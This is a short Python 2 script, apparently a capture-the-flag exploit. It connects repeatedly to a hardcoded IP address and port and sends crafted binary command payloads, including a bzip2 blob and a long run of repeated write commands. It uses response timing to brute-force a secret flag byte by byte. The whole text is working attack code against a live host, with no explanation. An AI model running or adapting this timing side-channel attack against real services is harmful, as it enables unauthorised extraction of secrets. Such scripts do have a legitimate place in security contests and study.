mport socket
import time

compute_flag_cmd = '\x01\x00\x10'
flag = '\x00\x00\x00\x00\x00\x00\x00\x00\x41\x41\x41\x41\x41\x41\x41\x41'
write_bz_cmd = '\x02\x00\x31'
bz_data = '\x42\x5a\x68\x39\x31\x41\x59\x26\x53\x59\x33\x54\x53\x79\x00\x50\x50\x40\x20\xc0\x00\x00\x04\x00\x08\x20\x00\x30\xcc\x05\x29\xa6\x04\x81\x36\x20\x90\x27\x8b\xb9\x22\x9c\x28\x48\x19\xaa\x29\xbc\x80'
write_tmp_cmd = '\x03\x00\x00' * 5000
last_login_cmd = '\x08\x00\x00'
# change index as we discover each byte
idx = 8

for i in xrange(0, 256):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('54.65.162.169', 8888))

    payload = compute_flag_cmd
    payload += flag[:-idx] + chr(i) + chr(0xEB ^ idx) + chr(0x22 ^ idx) + chr(0x42 ^ idx) + chr(0x8F ^ idx) + chr(0x7F ^ idx) + chr(0xFF ^ idx) + chr(0xF9 ^ idx) + chr(0x0A ^ idx)
    payload += write_bz_cmd
    payload += bz_data
    payload += write_tmp_cmd

    start = time.time()
    s.send(payload)
    s.shutdown(socket.SHUT_WR)
    while len(s.recv(1)) > 0:
        pass
    end = time.time()

    print hex(i), int((end - start) * 1000)
